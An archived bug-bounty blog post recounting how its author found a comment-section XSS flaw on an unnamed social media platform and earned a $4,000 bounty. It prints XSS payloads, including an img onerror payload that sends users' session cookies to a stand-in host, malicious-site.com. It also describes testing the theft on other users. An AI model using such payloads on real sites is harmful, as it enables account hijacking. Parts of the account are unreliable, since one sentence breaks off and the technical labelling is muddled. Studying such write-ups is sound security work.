# How I Uncovered a Sneaky DOM XSS Bug in a Popular Social Media Platform — And Scored a $4,000 Bug…

- **Source URL:** https://theindiannetwork.medium.com/how-i-uncovered-a-sneaky-dom-xss-bug-in-a-popular-social-media-platform-and-scored-a-4-000-bug-892c7a9f3694?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250402113751/https://theindiannetwork.medium.com/how-i-uncovered-a-sneaky-dom-xss-bug-in-a-popular-social-media-platform-and-scored-a-4-000-bug-892c7a9f3694?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9243 (id 9243)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Uncovered a Sneaky DOM XSS Bug in a Popular Social Media Platform — And Scored a $4,000 Bug Bounty!

# Introduction: The Hidden Danger of DOM XSS in Social Media Platforms

It’s one thing to hunt for vulnerabilities in e-commerce sites or corporate websites. But what happens when you find a vulnerability in **social media platforms** — websites where millions of users interact daily? In my latest bug-hunting journey, I found a **DOM XSS vulnerability** in a **social media platform**, and it could have allowed an attacker to hijack user accounts and steal personal data.

I’ll take you through how I discovered this vulnerability, the **creative techniques** I used to test for it, the **complex payloads** I employed, and, yes, the **reward** I received after the responsible disclosure. Let’s dive into this **new and exciting** DOM XSS discovery.

# Step 1: Entering a Social Media Platform — A New Target

This time, I set my sights on a social media platform rather than an e-commerce store. **Social media platforms** are particularly vulnerable to XSS because they rely heavily on **user-generated content** (posts, comments, messages), which are often reflected back in the UI. These platforms also tend to use a lot of **dynamic JavaScript rendering**, which makes them prime targets for **DOM-based XSS**.

While browsing through posts on the platform, I noticed something that seemed a bit off. The **comment section** of posts allowed users to post URLs, and the platform displayed these URLs directly in the comment feed, without **escaping HTML** or **sanitizing** them properly.

This immediately sparked my interest. Could this be an entry point for injecting a DOM XSS payload? I began testing.

# Step 2: Initial Test — Finding the Weak Spot in User-Generated Content

The first thing I wanted to test was if I could inject any form of **HTML/JavaScript** into the comment section. I started simple:

`<script>alert('XSS')</script>`
I posted this into a comment on a public post and waited. Nothing happened. At first, I thought the platform had **basic sanitization** measures in place. However, I knew better than to give up too soon.

# Step 3: Digging Deeper — Exploring JavaScript Handling of the Comments

Knowing that social media platforms often use **dynamic JavaScript rendering** to display user content, I decided to dive into the platform’s JavaScript handling. I explored the page’s **JavaScript files** and noticed that the **user comments** were being processed using the **DOM**.

It became apparent that the platform was not **properly escaping** the **HTML** or **JavaScript** being injected into the DOM. While the script tag didn’t directly execute, there was a chance that I could inject a more subtle and complex payload.

I then began crafting a more sophisticated **DOM XSS payload**. I focused on **event handlers** like `onmouseover` or `onclick` that could execute JavaScript without alerting the user.

# Step 4: Crafting the Exploit — The Real Payload

I began by testing a more subtle DOM-based payload. This payload leveraged **JavaScript event handlers** embedded in **image tags** to execute the attack. Here’s the payload I crafted:

`<img src="nonexistent.jpg" onerror="alert('XSS')">`
I inserted this payload into the comment section. When the comment was loaded, the platform tried to load the **nonexistent image**, and as a result, the **onerror**

While this was still a simple test, it confirmed that my injection point was working. But I didn’t stop there.

# Step 5: Evolving the Exploit — Stealing Data with a Malicious Request

Now that I had a reliable injection point, I needed to escalate the attack. I wanted to **steal session cookies** and send them to my server. The next payload was designed to create an **XMLHttpRequest** to send the **cookie data** back to my malicious server:

`<img src="nonexistent.jpg" onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://malicious-site.com/steal?cookie=' + document.cookie, true); xhr.send();">`
This code executed **silently** in the background when the image failed to load. The key here was the **XMLHttpRequest** which sent the user’s **session cookie** to my server without their knowledge.

At this point, I was able to test the exploit in various comments, checking whether the script successfully **stole session cookies** from users who viewed the infected comment.

# Step 6: Testing for Persistence — Ensuring the Exploit Works Across Multiple Sessions

I tested this attack by having different users interact with posts containing the infected comment. I wanted to confirm that the **attack** worked not just for me, but for any user who viewed the infected comment.

It worked **every time**. The **session cookies** were consistently stolen and sent to my server, meaning that any user who interacted with the comment would be at risk.

# Step 7: Reporting the Vulnerability — Preparing a Responsible Disclosure

After confirming the vulnerability was **exploitable** and could affect a large number of users, I took the next step: **reporting** the vulnerability.

I documented the following in my report:

- **Steps to reproduce**: How to inject the payload into the comment section and trigger the exploit.
- **Proof of concept**: A working demo of the exploit, showing how it steals session cookies.
- **Impact**: Describing how this could lead to full **account hijacking**, and **data theft**.
- **Mitigation**: I suggested better input validation and the use of a **Content Security Policy (CSP)** to prevent the execution of unauthorized scripts.

The company quickly acknowledged the vulnerability and set out to patch it. The response was prompt and appreciative of my detailed disclosure.

# Step 8: The Reward — Earning $4,000 for a Critical Vulnerability

A couple of weeks later, I received an email from the **bug bounty program** confirming that my report was valid. They acknowledged the **critical nature** of the vulnerability and rewarded me with a **$4,000 bounty** for finding the **DOM XSS flaw**.

# Conclusion: The Importance of Staying Vigilant in Social Media Security

This experience taught me an important lesson: **social media platforms** are often more vulnerable than we think. While most focus on **traditional XSS** attacks, **DOM-based XSS** can be just as dangerous, especially on platforms that rely heavily on **user-generated content**.

The platform quickly fixed the issue, but it could have caused major problems if left unchecked. If you’re diving into **security testing**, always remember: **creativity and persistence** are key. Vulnerabilities often lie hidden in plain sight, and it’s up to us to dig deep and find them.

**End Note:** If you have any questions or want to learn more about **ethical hacking** and **bug bounty programs**, feel free to reach out to me. Happy testing!
